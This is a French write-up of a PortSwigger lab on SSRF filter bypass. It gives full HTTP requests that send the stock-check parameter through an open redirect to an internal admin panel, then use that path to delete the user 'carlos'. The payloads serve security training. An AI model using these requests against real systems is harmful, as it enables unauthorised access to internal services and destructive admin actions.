# Lab

https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection

## Solution

Il y a une open redirection dans le sitevia le lien `Next product` qui redirige vers `https://0af000de03e3d65382dcdff6005500c1.web-security-academy.net/product/nextProduct?currentProductId=3&path=/product?productId=4`.

Si on modifie le paramètre `path` pour qu'il pointe vers un site externe, on peut faire une SSRF.

```http
POST /product/stock HTTP/2
Host: 0af000de03e3d65382dcdff6005500c1.web-security-academy.net
Cookie: session=Vjosk5BlBUVJzDZDJkA3z2aQaxN1xCtj; session=IteJFG2MUbHoT0xtRIkpsZ9Ud1p6GFWK
Content-Length: 92
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0af000de03e3d65382dcdff6005500c1.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0af000de03e3d65382dcdff6005500c1.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

stockApi=/product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp://192.168.0.12:8080/admin
```

Nous emmène vers la page d'admin de l'application.

On peut réutiliser cette requête pour supprier l'utilisateur `carlos`:

```http
POST /product/stock HTTP/2
Host: 0af000de03e3d65382dcdff6005500c1.web-security-academy.net
Cookie: session=Vjosk5BlBUVJzDZDJkA3z2aQaxN1xCtj; session=IteJFG2MUbHoT0xtRIkpsZ9Ud1p6GFWK
Content-Length: 115
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0af000de03e3d65382dcdff6005500c1.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0af000de03e3d65382dcdff6005500c1.web-security-academy.net/product?productId=3
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

stockApi=/product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp://192.168.0.12:8080/admin/delete?username=carlos
```
